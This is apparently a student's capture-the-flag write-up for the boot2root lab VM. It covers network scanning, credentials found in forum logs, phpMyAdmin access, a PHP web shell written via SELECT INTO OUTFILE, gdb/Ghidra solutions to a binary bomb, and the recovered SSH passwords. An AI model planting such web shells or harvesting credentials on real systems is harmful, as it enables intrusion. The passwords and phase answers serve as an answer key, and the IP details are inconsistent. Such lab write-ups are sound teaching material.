@@ -1,0 +1,301 @@
+On setup un virtualdisk Linux 64bits sur VirtualBox.
+On lui plante l'ISO boot2root dans lcul.
+On change les parametres reseau pour lui mettre en BridgeAdapter, pour que la VM ai une adresse IP sur notre reseau local.
+
+find IP address, on host enter:
+$ VBoxManage guestproperty get boot2root "/VirtualBox/GuestInfo/Net/0/V4/IP"
+or
+$ ifconfig on host machine, returns:
+	vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
+        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 65  bytes 9509 (9.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+So boot2root's ip address is 192.168.56.1
+
+
+We are going to use a kali linux's virtual machine to pentest boot2root.
+We boot up the VM using virtualbox, than we can start using Kali.
+We will use nmap tool to scan the ip address range of the boot2root virtual machine.
+$ nmap 192.168.56.0-255
+	Starting Nmap 7.92SVN ( https://nmap.org ) at 2022-10-11 15:30 CEST
+	Nmap scan report for e1r3p13.clusters.42paris.fr (192.168.56.1)
+	Host is up (0.00037s latency).
+	Not shown: 995 closed tcp ports (conn-refused)
+	PORT     STATE SERVICE
+	22/tcp   open  ssh
+	111/tcp  open  rpcbind
+	2049/tcp open  nfs
+	5900/tcp open  vnc
+	9100/tcp open  jetdirect
+
+	Nmap scan report for 192.168.56.102
+	Host is up (0.00014s latency).
+	Not shown: 994 closed tcp ports (conn-refused)
+	PORT    STATE SERVICE
+	21/tcp  open  ftp
+	22/tcp  open  ssh
+	80/tcp  open  http
+	143/tcp open  imap
+	443/tcp open  https
+	993/tcp open  imaps
+
+	Nmap done: 256 IP addresses (2 hosts up) scanned in 3.74 seconds
+Two addresses are up, and we can see that multiple ports are up:
+	- ssh, rpcbind, nfs, vnc, jetdirect for 192.168.56.1
+	- ftp, ssh, http, map, https, imaps for 192.168.56.102
+
+Using dirb utility from kali, we find that multiple web addresses are up:
+$ dirb 192.168.56.102
+	==> DIRECTORY: http://192.168.56.102/fonts/
+	+ http://192.168.56.102/forum (CODE:403|SIZE:287)                           
+	+ http://192.168.56.102/index.html (CODE:200|SIZE:1025)                     
+	+ http://192.168.56.102/server-status (CODE:403|SIZE:295)
+Lets open the forum address in a browser and see if we can find something there.
+On the forum, we can see a topic titled: "Probleme login?", and by accessing the link, we stumbe upon the machine's ssh logs. Let's dig into them to try and find some information.
+
+We see that the topic was created by lmezard, so we know that lmezard is a valid user for the forum. We dumbly look for "password" string in the logs, and see that 42 occurences pop up. The 11th occurence of the "password" string reveals what looks like a password mistaken for a login: !q\]Ej?*5K5cy*AJ, and that right after that line, user lmezard succesfully logged in.
+
+We try to use the credentials login lmezard password !q\]Ej?*5K5cy*AJ on the forum, and we successfully log in.
+On the top right corner of the forum webpage, we access the lmezard user page. From here, not a lot we can do appart from editing our profile. We do find an email address though (laurie@borntosec.net), lets try to make use of it.
+
+We know from our nmap scan that port 143 is in use for imap, this implies that there is a webmail server running. If we rerun the dirb command with https instead of http and with option -r to search without recursivity, we see 3 accessible addresses:
+$ dirb https://192.168.56.102 -r
+	---- Scanning URL: https://192.168.56.102/ ----  
+	+ https://192.168.56.102/cgi-bin/ (CODE:403|SIZE:291)                       
+	==> DIRECTORY: https://192.168.56.102/forum/
+	==> DIRECTORY: https://192.168.56.102/phpmyadmin/
+	+ https://192.168.56.102/server-status (CODE:403|SIZE:296)                  
+	==> DIRECTORY: https://192.168.56.102/webmail/
+                                                                               
+	-----------------
+	END_TIME: Tue Oct 11 10:11:37 2022
+	DOWNLOADED: 4612 - FOUND: 2
+Lets try and access the webmail account with credentials laurie@borntosec.net !q\]Ej?*5K5cy*AJ
+And we are in ! In the mailbox we see 2 mails, one named DB Access and the other Very interesting!!!.
+The DB access mail holds credentials for database access, it looks like. (root/Fg-'kKXBj87E:aJ$)
+Lets try and access phpmyadmin with those credentials.
+And we are in phpmyadmin.
+In the table mlf2_userdata, we can see all of the user data (logins, hashed passwords, email addresses...)
+
+
+We will now use an exploit through phpmyadmin to insert malicious code through sql.
+We create a webpage that will emulate a shell on the attacked system using:
+	SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
+We store it in the dir we found using dirb earlier, where php looks for templates.
+Now, by inputing https://192.168.56.102/forum/templates_c/backdoor.php?cmd=cmd we can start running shell commands on the attacked system.
+Lets have a look around:
+https://192.168.56.102/forum/templates_c/backdoor.php?cmd=ls%20/home
+gives us:
+LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
+lets see what does the LOOKATME file holds:
+holds a file called password, when we cat it we get another couple of credentials:
+https://192.168.56.102/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+Lets try it on ssh, it does not work.
+From our nmap, we know that we have ftp port opened (port 21)
+We have access to the FTP server through command:
+	ftp lmezard@192.168.56.102
+We find a README and a file named fun, we retrieve them using get.
+Content of README is:
+	$ cat README
+	Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+if we run:
+	$ file fun
+	fun: POSIX tar archive (GNU)
+We see that the file fun is an archive. We will unzip it now:
+	$ mv fun fun.tar
+	$ tar -xvf fun.tar
+That creates a folder named ft_fun. Inside, there are a lot of PCAP files, which are files containing packets of data of a network. Lets analyze them.
+A lot of file contain "useless" functions.
+We see files that contain a getme() function with a number, so we locate them using:
+	$ grep get *
+	0T16C.pcap:char getme4() {
+	4KAOH.pcap:char getme5() {
+	32O0M.pcap:char getme7() {
+	91CD0.pcap:char getme6() {
+	331ZU.pcap:char getme1() {
+	B62N4.pcap:char getme3() {
+	BJPCP.pcap:char getme8() {
+	BJPCP.pcap:char getme9() {
+	BJPCP.pcap:char getme10() {
+	BJPCP.pcap:char getme11() {
+	BJPCP.pcap:char getme12()
+	BJPCP.pcap:     printf("%c",getme1());
+	BJPCP.pcap:     printf("%c",getme2());
+	BJPCP.pcap:     printf("%c",getme3());
+	BJPCP.pcap:     printf("%c",getme4());
+	BJPCP.pcap:     printf("%c",getme5());
+	BJPCP.pcap:     printf("%c",getme6());
+	BJPCP.pcap:     printf("%c",getme7());
+	BJPCP.pcap:     printf("%c",getme8());
+	BJPCP.pcap:     printf("%c",getme9());
+	BJPCP.pcap:     printf("%c",getme10());
+	BJPCP.pcap:     printf("%c",getme11());
+	BJPCP.pcap:     printf("%c",getme12());
+	G7Y8I.pcap:char getme2() {
+some of the files we open such as 0T16C.pcap have a missing bit of their function, which is usually the letter from the password, however it is replaced by a commentary with the number of the file.
+For OT16C.pcap for example, the file is like so:
+	$ cat OT16C.pcap 
+	char getme4() {
+
+	//file115
+We grep for the file after:
+	$ grep //file116
+	7DT5Q.pcap://file116
+We cat that file:
+	$ cat 7DT5Q.pcap
+	return 'a';
+
+	//file116
+We found the missing letter. Following that logic, we find all the remaning missing letters.
+We compile the program get_ssh.c and run it:
+	MY PASSWORD IS: Iheartpwnage
+	Now SHA-256 it and submit%
+We go to https://emn178.github.io/online-tools/sha256.html to sha256 the password, we get:
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+so this is the password to ssh into laurie account. Lets try it out:
+	$ ssh laurie@192.168.56.102
+	We're in!
+In user laurie's home, we get two files: a README and a bomb. The README tells us that we have to diffuse the bomb to get the password to ssh into thor account.
+
+LAURIE PHASE 1
+We use gdb to disassemble the bomb:
+In the main, we see a call to initialize_bomb() function, then a call to read_line is made. This is where we get to input something.
+There are 6 phases in the bomb, we need to defuse all 6 of them. We start with phase_1:
+	(gdb) disas phase_1
+In the disas, we see a push before a call to test:
+	0x08048b2c <+12>:    push   $0x80497c0
+we print the content of that:
+	(gdb) x/s 0x80497c0
+	0x80497c0:       "Public speaking is very easy."
+First phase defused, on to the next one.
+	
+
+LAURIE PHASE 2
+	(gdb) disas phase_2
+call to read_six_numbers function.
+	(gdb) disas read_six_numbers
+We see that the function waits for 6 digits, each one separated by a whitespace.
+We know from the hint that digit number 2 will be 2.
+We put the bomb binary into ghidra and look for the read_six_numbers function.
+In the function reconstruction, we see this line that interests us:
+	  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",param_2,param_2 + 4,param_2 + 8,param_2 + 0xc,
+                 param_2 + 0x10,param_2 + 0x14);
+So after analyzing we see that read_six_number awaits for a suite of numbers where each next number is the current one multiplied by its postion in the suite:
+1 2 6 24 120 720
+
+LAURIE PHASE 3
+By looking at the reconstructed phase_3 function in ghidra, we see that the function awaits for an input of one number, one char and another number. We know from the hint that the middle char is b. The function has a switch based on first input.
+Answers are:
+1b214
+2b755
+
+
+LAURIE PHASE 4
+Again, looking at the function phase_4 in ghidra, we see that it is waiting for a decimal input, then sends that input to a function, lets call it test, which output will decide if the bomb explodes or not.
+
+in test function, we see that the input must be >=2. We reconstructed the function in python because fuck c, and after trying inputs from 2 up, we find that the wanted value is 9.
+
+
+LAURIE PHASE 5
+We see from hint that first letter is an o. From ghidra we see that a comparison is made between input and the string "giants", and that the input must be of len 6.
+We understand that the string transformation algorithm does a bitwise comparison between each char in our input and 0xf. This will create an index, used by the algo to retrieve a char in the 'isrveawhobpnutfg' array. The final string will be compared to "giants", if test passes, we pass.
+We will try and recreate the algorithm that transforms the input to find a valid input. See phase_5_transform_string.py.
+One working answer is:
+	g o 
+	i p
+	a e
+	n k
+	t m
+	s q
+	opekmq
+
+
+LAURIE PHASE_6
+Phase_6 function reconstructed code looks really heavy, with a lot of loops in loops.
+We understand quite easely that the function awaits for 6 numbers, and that each of these numbers must be between 1 and 6 and unique. Hint tells us that first number will be a 4. 
+By digging into phase_6 with gdb, with find the value of a node:
+	(gdb) x/d 0x804b26c
+	0x804b26c <node1>:	253
+We find other nodes:
+	(gdb) x/20x 0x804b26c - 0x40
+	0x804b22c <array.123+12>:	0x67667475	0x000001b0	0x00000006	0x00000000
+	0x804b23c <node5>:	0x000000d4	0x00000005	0x0804b230	0x000003e5
+	0x804b24c <node4+4>:	0x00000004	0x0804b23c	0x0000012d	0x00000003
+	0x804b25c <node3+8>:	0x0804b248	0x000002d5	0x00000002	0x0804b254
+	0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260	0x000003e9
+	(gdb) x/20x 0x804b26c - 0x42
+	0x804b22a <array.123+10>:	0x74756e70	0x01b06766	0x00060000	0x00000000
+	0x804b23a <node6+10>:	0x00d40000	0x00050000	0xb2300000	0x03e50804
+	0x804b24a <node4+2>:	0x00040000	0xb23c0000	0x012d0804	0x00030000
+	0x804b25a <node3+6>:	0xb2480000	0x02d50804	0x00020000	0xb2540000
+	0x804b26a <node2+10>:	0x00fd0804	0x00010000	0xb2600000	0x03e90804
+
+
+	(gdb) x/d 0x804b26c
+        0x804b26c <node1>:      253
+	(gdb) x/d 0x0804b260
+	0x804b260 <node2>:	725
+	(gdb) x/d 0x0804b254
+	0x804b254 <node3>:	301
+	(gdb) x/x 0x0804b248
+	0x804b248 <node4>:	997
+	(gdb) x/d 0x0804b23c
+	0x804b23c <node5>:	212
+	(gdb) x/d 0x0804b230
+	0x804b230 <node6>:	432
+
+What the function phase_5 does is that it takes our list of numbers as a list of indexes, and then makes a comparison between node at index i and node at index i - 1. node[i] must be < to node[i-1].
+
+The answer is:
+	4 2 6 3 1 5
+
+
+ANSWERS LAURIE
+phase_1: Public speaking is very easy.
+phase_2: 1 2 6 24 120 720
+phase_3: 1b214
+phase_4: 9
+phase_5: opekmq
+phase_6: 4 2 6 3 1 5
+
+
+The password for thor's ssh account must then be:
+Publicspeakingisveryeasy.126241207201b2149opekmq426315
+However, this password does not work. Speaking with friends who have done the project, there seams to be a problem with the ISO, and two digits must be inverted in order for the connection to work, so here are the new credentials:
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+THOR
+Readme saying to use challenge result as password for zaz user.
+file named turtle.
+So we write a little program named tortue_geniale.py to show what the message is. message printed to screen is "SLASH".
+We try it out for zaz account, does not work.
+We try out sha256 for slash for zaz account, does not work
+We try md5 for slash for zaz account, works:
+
+login: zaz
+pwd: 646da671ca01bb5d84dbb5fb2238dc8e
+
+
+LINKS:
+https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
+
+NOTES:
+(gdb) display *(int*)(0x14 + $edx) to print offset of register
